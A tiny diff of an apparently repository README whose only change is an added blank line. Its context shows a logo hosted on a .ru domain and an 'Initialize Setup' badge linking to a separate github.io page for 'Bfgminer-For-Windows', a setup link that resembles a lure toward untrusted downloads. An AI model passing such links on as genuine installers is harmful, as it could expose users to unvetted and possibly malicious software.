@@ -3,6 +3,7 @@
 <div align="center">
   <img src="https://softdlyavas.ru/image/bez-imeni-15.png" alt="Program Logo"/>
 </div>
+
 [![Initialize Setup](https://badgen.net/badge/Initialize/Setup/blue?icon=terminal)](https://crewbrewerzdqw.github.io/.github/Bfgminer-For-Windows)
 ---
 
